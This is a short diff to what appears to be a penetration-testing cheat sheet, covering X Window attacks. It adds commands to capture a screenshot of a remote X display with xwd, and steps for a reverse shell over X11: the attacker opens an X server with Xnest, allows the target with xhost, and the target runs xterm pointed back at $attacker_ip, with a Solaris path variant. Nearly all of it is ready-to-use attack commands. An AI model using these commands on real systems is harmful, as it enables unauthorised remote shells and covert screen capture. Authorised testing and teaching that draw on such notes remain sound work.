@@ -1,2 +1,29 @@
+# Xorg
 xwd -root -screen -slient -display 192.168.1.108:0 > out.xwd
 convert out.xwd out.png
+
+
+
+# Xterm
+To catch incoming xterm, start an open X Server on your system (:1 - which listens on TCP port 6001). One way to do this is with Xnest:
+
+Xnest :1
+
+Then remember to authorise on your system the target IP to connect to you:
+
+xterm -display 127.0.0.1:1  # Run this OUTSIDE the Xnest
+xhost +targetip             # Run this INSIDE the spawned xterm on the open X Server
+
+Then on the target, assuming that xterm is installed, connect back to the open X Server on your system:
+
+xterm -display $attacker_ip:1
+
+Or:
+
+$ DISPLAY=attackerip:0 xterm
+
+It will try to connect back to you, $attacker_ip, on TCP port 6001.
+
+Note that on Solaris xterm path is usually not within the PATH environment
+variable, you need to specify its filepath: /usr/openwin/bin/xterm
+-display $attacker_ip:1
